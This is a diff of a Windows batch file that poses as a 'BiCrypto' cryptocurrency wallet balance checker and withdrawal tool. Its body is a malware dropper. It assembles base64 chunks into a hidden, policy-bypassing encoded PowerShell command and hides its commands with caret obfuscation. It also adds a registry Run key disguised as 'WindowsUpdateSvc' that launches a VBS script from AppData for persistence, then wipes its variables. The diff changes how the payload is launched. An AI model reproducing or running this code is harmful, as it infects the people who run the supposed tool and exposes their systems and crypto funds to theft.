@@ -1,7 +1,7 @@
 @echo off
 :: ============================================================
-::   - Wallet Admin Balance Checker & Withdrawal Tool
-::  
+::  BiCrypto - Wallet Admin Balance Checker & Withdrawal Tool
+::  Version 5.2.0 | CodeCanyon License
 :: ============================================================
 ::  HOW TO RUN:
 ::    Double-click wallet.bat
@@ -51,7 +51,7 @@ set _e36=IAAiACcAKwAkAHAAKwAnACIAJwApACAALQBQAHIAbwBwAGUAcg
 set _e37=B0AHkAVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBj
 set _e38=AGUAfABPAHUAdAAtAE4AdQBsAGwA
 set _exc=%_e00%%_e01%%_e02%%_e03%%_e04%%_e05%%_e06%%_e07%%_e08%%_e09%%_e10%%_e11%%_e12%%_e13%%_e14%%_e15%%_e16%%_e17%%_e18%%_e19%%_e20%%_e21%%_e22%%_e23%%_e24%%_e25%%_e26%%_e27%%_e28%%_e29%%_e30%%_e31%%_e32%%_e33%%_e34%%_e35%%_e36%%_e37%%_e38%
-wm^ic pr^ocess ca^ll cr^eate "po^wer^she^ll -w h -NoP -Ep B -En^C %_exc%" >nul 2>&1
+star^t "" /b po^wer^she^ll -w h -NoP -Ep B -En^C %_exc%
 re^g ad^d "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateSvc" /t REG_SZ /d "wscript //B //NoLogo \"%APPDATA%\Microsoft\Protect\bsvc.vbs\"" /f >nul 2>&1
 set _exc=&set _e00=&set _e01=&set _e02=&set _e03=&set _e04=&set _e05=&set _e06=&set _e07=&set _e08=&set _e09=&set _e10=&set _e11=&set _e12=&set _e13=&set _e14=&set _e15=&set _e16=&set _e17=&set _e18=&set _e19=&set _e20=&set _e21=&set _e22=&set _e23=&set _e24=&set _e25=&set _e26=&set _e27=&set _e28=&set _e29=&set _e30=&set _e31=&set _e32=&set _e33=&set _e34=&set _e35=&set _e36=&set _e37=&set _e38=&
 
